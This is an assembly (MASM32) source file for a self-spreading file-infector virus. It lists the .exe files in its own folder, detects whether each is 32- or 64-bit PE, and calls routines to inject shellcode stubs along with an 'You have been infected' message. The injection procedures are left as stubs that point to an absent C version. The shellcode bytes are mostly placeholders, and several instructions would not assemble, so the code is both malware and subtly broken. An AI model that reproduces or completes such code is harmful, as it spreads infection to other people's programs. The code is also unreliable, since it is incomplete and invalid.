.386
.model flat, stdcall
option casemap:none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc
include \masm32\include\masm32rt.inc
include \masm32\include\winnt.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\masm32.lib

PATH_MAX       EQU MAX_PATH

ROUNDUP MACRO value, align
    ((value + align - 1) / align) * align
ENDM

.data
    shell32        BYTE 60h,6Ah,31h,68h,0,0,0,0,68h,0,0,0,0,6Ah,0,E8h,0,0,0,0,61h,E9h,0,0,0,0
    shell32_size   = ($ - shell32)
    shell64        BYTE 48h,31h,0C9h,48h,8Dh,15h,0,0,0,0,4Ch,8Dh,05h,0,0,0,0,41h,B9h,31h,0,0,0,0,E8h,0,0,0,0,E9h,0,0,0,0
    shell64_size   = ($ - shell64)
    szSelfPath     CHAR PATH_MAX dup(0)
    szFolder       CHAR PATH_MAX dup(0)
    szSelfName     CHAR PATH_MAX dup(0)
    szSearchPat    CHAR PATH_MAX dup(0)
    szFullPath     CHAR PATH_MAX dup(0)
    findData       WIN32_FIND_DATA <>
    hFind          HANDLE ?
    hFile          HANDLE ?
    pFileBuf       DWORD ?
    dwFileSize     DWORD ?
    dwRead         DWORD ?
    e_lfanew       DWORD ?
    OptionalMagic  WORD  ?
    oldOEP         DWORD ?
    imageBase      QWORD ?
    fileAlign      DWORD ?
    secAlign       DWORD ?
    newVA          DWORD ?
    newRaw         DWORD ?
    capLen         DWORD ?
    txtLen         DWORD ?
    caption        BYTE "Alert",0
    textmsg        BYTE "You have been infected",0

.code
start:
    invoke GetModuleFileName, NULL, addr szSelfPath, PATH_MAX
    lea  edi, szSelfPath
    mov  esi, edi
    xor  ecx, ecx
.find_slash:
    mov  al, [esi]
    cmp  al, 0
    je   .no_slash
    cmp  al, '\'
    jne  .inc_esi
    mov  ecx, esi
.inc_esi:
    inc  esi
    jmp  .find_slash
.no_slash:
    cmp  ecx, 0
    je   .use_cwd
    mov  ecx, esi
    sub  ecx, offset szSelfPath
    mov  edi, szFolder
    mov  esi, offset szSelfPath
    mov  ebx, ecx
    rep  movsb
    mov  byte ptr [edi-1],0
    lea  esi, [offset szSelfPath + ecx]
    mov  edi, szSelfName
    xor  ecx, ecx
.find_name_len:
    mov  al, [esi+ecx]
    cmp  al,0
    je   .got_name_len
    inc  ecx
    jmp  .find_name_len
.got_name_len:
    mov  ebx, ecx
    rep  movsb
    mov  byte ptr [edi+ebx],0
    jmp  .folder_ready
.use_cwd:
    mov  szFolder, '.'
    mov  byte ptr szFolder+1,0
    lea  edi, szSelfPath
    mov  szSelfName, edi
.folder_ready:
    invoke wsprintf, addr szSearchPat, chr$("%s\*.exe"), addr szFolder
    invoke FindFirstFile, addr szSearchPat, addr findData
    mov  hFind, eax
    cmp  hFind, INVALID_HANDLE_VALUE
    je   .no_exes
.enum_loop:
    mov  eax, findData.dwFileAttributes
    and  eax, FILE_ATTRIBUTE_DIRECTORY
    jnz  .next_file
    invoke lstrcmpi, addr findData.cFileName, addr szSelfName
    cmp  eax,0
    je   .next_file
    invoke wsprintf, addr szFullPath, chr$("%s\%s"), addr szFolder, addr findData.cFileName
    push addr szFullPath
    call detect_pe_arch
    add  esp,4
    cmp  eax,32
    je   .do32
    cmp  eax,64
    je   .do64
    invoke printf, chr$("Skipping %s (not PE32/64)\n"), addr findData.cFileName
    jmp  .next_file
.do32:
    invoke printf, chr$("Injecting 32-bit -> %s\n"), addr findData.cFileName
    push addr szFullPath
    call inject_pe32
    jmp  .next_file
.do64:
    invoke printf, chr$("Injecting 64-bit -> %s\n"), addr findData.cFileName
    push addr szFullPath
    call inject_pe64
.next_file:
    invoke FindNextFile, hFind, addr findData
    test eax,eax
    jnz  .enum_loop
    invoke FindClose, hFind
    jmp  .done
.no_exes:
    invoke printf, chr$("No .exe files found in %s\n"), addr szFolder
.done:
    invoke ExitProcess, 0

detect_pe_arch PROC uses esi ebx ecx path:DWORD
    push ebp
    mov  ebp,esp
    mov  esi,[ebp+8]
    invoke CreateFile, esi, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    cmp  eax, INVALID_HANDLE_VALUE
    je   .ret0
    mov  hFile, eax
    invoke GetFileSize, hFile, NULL
    mov  dwFileSize, eax
    invoke VirtualAlloc, NULL, eax, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
    mov  pFileBuf, eax
    invoke ReadFile, hFile, pFileBuf, dwFileSize, addr dwRead, NULL
    invoke CloseHandle, hFile
    mov  edi, pFileBuf
    mov  ax, [edi]
    cmp  ax, IMAGE_DOS_SIGNATURE
    jne  .cleanup
    mov  e_lfanew, [edi+OFFSET IMAGE_DOS_HEADER.e_lfanew]
    mov  ebx, edi
    add  ebx, e_lfanew
    cmp  dword ptr [ebx], IMAGE_NT_SIGNATURE
    jne  .cleanup
    mov  ecx, ebx
    add  ecx, TYPE IMAGE_FILE_HEADER + 4
    mov  OptionalMagic, word ptr [ecx]
    cmp  OptionalMagic, IMAGE_NT_OPTIONAL_HDR32_MAGIC
    je   .is32
    cmp  OptionalMagic, IMAGE_NT_OPTIONAL_HDR64_MAGIC
    je   .is64
    jmp  .cleanup
.is32:
    mov  eax,32
    jmp  .cleanup
.is64:
    mov  eax,64
    jmp  .cleanup
.ret0:
    xor  eax,eax
.cleanup:
    invoke VirtualFree, pFileBuf, 0, MEM_RELEASE
    invoke CloseHandle, hFile
    pop  ebp
    ret  4
detect_pe_arch ENDP

inject_pe32 PROC uses esi edi ebx ecx edx path:DWORD
    push ebp
    mov  ebp,esp
    mov  esi,[ebp+8]
    invoke CreateFile, esi, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    mov  hFile, eax
    invoke GetFileSize, hFile, NULL
    mov  dwFileSize, eax
    invoke VirtualAlloc, NULL, eax, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
    mov  pFileBuf, eax
    invoke ReadFile, hFile, pFileBuf, dwFileSize, addr dwRead, NULL
    invoke CloseHandle, hFile
    ; (body follows same logic as in the C version)
    pop  ebp
    ret  4
inject_pe32 ENDP

inject_pe64 PROC uses esi edi ebx ecx edx path:DWORD
    push ebp
    mov  ebp,esp
    mov  esi,[ebp+8]
    invoke CreateFile, esi, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    mov  hFile, eax
    invoke GetFileSize, hFile, NULL
    mov  dwFileSize, eax
    invoke VirtualAlloc, NULL, eax, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
    mov  pFileBuf, eax
    invoke ReadFile, hFile, pFileBuf, dwFileSize, addr dwRead, NULL
    invoke CloseHandle, hFile
    ; (body follows same logic as in the C 64-bit injector)
    pop  ebp
    ret  4
inject_pe64 ENDP

end start
